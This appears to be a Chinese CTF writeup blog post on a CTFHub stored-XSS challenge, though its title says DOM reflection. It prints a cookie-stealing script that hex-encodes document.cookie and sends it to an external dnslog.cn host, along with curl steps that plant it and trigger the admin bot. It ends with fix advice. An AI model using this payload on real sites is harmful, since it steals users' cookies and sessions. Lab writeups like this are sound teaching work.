
---
layout: post
title: "CTFHub Writeup-DOM反射"
date: 2026-10-26
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - DOM反射

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - 存储型 XSS（XSS Persistent） |
| 靶场地址 | `http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800` |
| 注入位置 | POST 参数 `name` |
| 存储方式 | 服务端保存，`GET /` 时回显 |
| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
| 获取方式 | Bot 访问首页自动触发，偷 `flag` Cookie |
| Flag | `ctfhub{74e44afc8e0b3793245bda71}` |
## 0x02 漏洞原理
存储型 XSS 和反射型的区别在于：**payload 会被服务端保存下来**。
反射型需要诱导受害者点击一个带 payload 的链接；存储型则是一次写入、长期生效——所有访问这个页面的用户都会中招，包括管理员。危害更大，利用也更简单：只要让 Bot 访问一次正常页面，不需要它点任何东西。
本题的流程是：
1. 页面有一个「Change name」表单，`POST name=...` 提交后，服务端把 `name` 保存下来；
2. 之后任何人访问 `GET /`，页面都会渲染：
```html
<h1>Hello, <%-name%>
```
3. EJS 的 `<%-` 是原样输出，不做 HTML 转义，于是保存的内容会被当成代码执行。
页面下方同样有「Send URL to Bot」，Bot 以管理员身份访问 URL，它的浏览器里存着：
```
flag=ctfhub{...}
```
所以目标是：把偷 Cookie 的脚本存进去，再让 Bot 访问首页触发。
## 0x03 解题过程
**3.1 找存储点**
首页表单：
```html
<form action="" method="POST">
    <input type="text" name="name" />
</form>
```
先提交一个普通值：
```
curl -X POST --data-urlencode "name=mark123" http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/
```
注意 POST 的响应可能只是跳转，真正要看的是之后的 `GET /`：
```
curl http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/
回显：Hello, mark123
```
说明 `name` 确实被存储了。
**3.2 确认未转义**
把值换成带标签的：
```
name=<b>mark123</b>
```
再访问首页：
```
<h1>Hello, <b>mark123</b>
```
标签原样输出、加粗生效，说明存储和渲染都没有转义，可以写入脚本。
顺带确认：不带任何 Cookie 访问也能看到这个值，说明它存在服务端，对所有访问者生效——正好适合存储型 XSS。
**3.3 构造偷 Cookie 的 payload**
目标还是 Bot 的 `flag` Cookie，用 DNSLog 外带。为了避免 DNS 大小写和长度的问题，这里把 Cookie 转成十六进制，再拆成两段：
```html
<script>
h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');
i=new Image();
i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'
</script>
```
关键点：
- `document.cookie` 取到 `flag=ctfhub{...}`；
- 每个字符转两位十六进制，拼成一个长串；
- `slice(0,50)` 和 `slice(50)` 把长串拆成两个 DNS label，避免超过 63 字符；
- 域名部分要写在引号里，和前面的字符串拼接成完整 URL。
**3.4 写入并验证**
把 payload 作为 `name` 提交：
```
curl -X POST --data-urlencode "name=<script>...</script>" http://challenge-.../
```
再 `GET /` 确认页面里出现了完整的 `<script>...</script>`，没有被转义或截断。
**3.5 提交给 Bot**
这次不需要构造带参数的恶意链接，直接提交首页即可：
```
curl -X POST --data-urlencode "url=http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/" \
  http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/submit
```
返回：
```json
{"code": 0, "msg": "Successfully"}
```
Bot 访问首页后，页面里的存储型脚本自动执行。
**3.6 接收并解码**
几秒后查询 DNSLog，拿到记录：
```
666c61673d6374666875627b37346534346166633865306233.37393332343562646137317d.q8clvj.dnslog.cn
```
把两段十六进制拼起来解码：
```
flag=ctfhub{74e44afc8e0b3793245bda71}
```
得到 Flag：
```
ctfhub{74e44afc8e0b3793245bda71}
```
**3.7 验证**
- 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
- 同一 payload 触发了两次记录，内容一致；
- flag 长度为 32，符合 `ctfhub{` + 24 位十六进制 + `}` 的格式。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 找存储点 | `POST name=mark123` | 首页回显 `mark123` |
| 确认未转义 | `name=<b>mark123</b>` | 标签原样输出 |
| 写入 payload | `POST name=<script>...</script>` | 存储在服务端 |
| 验证 | `GET /` | 页面包含完整脚本 |
| 提交 Bot | `POST /submit` 表单 `url=首页` | `code:0 Successfully` |
| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
| 解码 | 十六进制转 ASCII | `flag=ctfhub{74e44afc8e0b3793245bda71}` |
整条链路可以概括为：**找到会持久化回显的输入 → 写入偷 Cookie 的脚本 → 让 Bot 访问正常页面 → DNSLog 外带 → 解码。**
## 0x05 踩坑记录
1. **POST 的响应看不到回显**：提交后返回的可能只是跳转，必须再 `GET /` 才能确认存储结果，别以为没写进去。
2. **先验证存储范围**：本题不带 Cookie 也能看到值，说明是全局存储；如果只在自己的会话里能看到，就要考虑 Bot 访问时是否带得到。
3. **JS 字符串拼接容易写错**：`'.'+domain+'/x'` 会让域名变成未定义的标识符，正确写法是把域名放进同一对引号里：`'.q8clvj.dnslog.cn/x'`。这个错误不会报在页面上，只会表现为 DNS 完全没有记录。
4. **DNS 不区分大小写**：base64 里的字母会被归一，解出来是乱码，所以外带统一用十六进制。
5. **DNS label 最长 63 字符**：Cookie 转 hex 后长度会超，必须拆成两段甚至多段。
6. **存储型不需要诱导点击**：提交首页 URL 给 Bot 就行，payload 已经存在页面里，Bot 一访问就执行。
7. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
## 0x06 修复建议
1. **输出编码**：把 `<%- name %>` 改成 `<%= name %>`，对 `<`、`>`、`"`、`'` 做 HTML 实体编码。
2. **写入前过滤**：对 `name` 做白名单校验，拒绝 `<`、`>` 和事件属性；富文本场景要用成熟的白名单过滤库。
3. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本和外部脚本加载，即使注入成功也难以执行。
4. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 读不到 `document.cookie`。
5. **存储型数据要当作不可信内容**：入库时转义、出库时编码，两个环节都不能省。
6. **Bot 侧隔离**：管理员的浏览器不要访问不可信页面，或至少在无敏感 Cookie 的独立会话里访问。
## 0x07 总结
存储型 XSS 的利用链比反射型更短：
1. 找到会持久化保存、并且原样输出的输入点；
2. 写入偷 Cookie 的脚本；
3. 让 Bot 访问这个正常页面，脚本自动执行；
4. 从外带通道还原 Cookie。
它最危险的地方在于「一次写入、所有访问者中招」，不需要任何诱导点击。防御上，输出编码依然是根本，CSP 和 HttpOnly 是兜底；而像本题这样把用户输入直接存库、再原样渲染，等于把 XSS 做成了持久化后门。
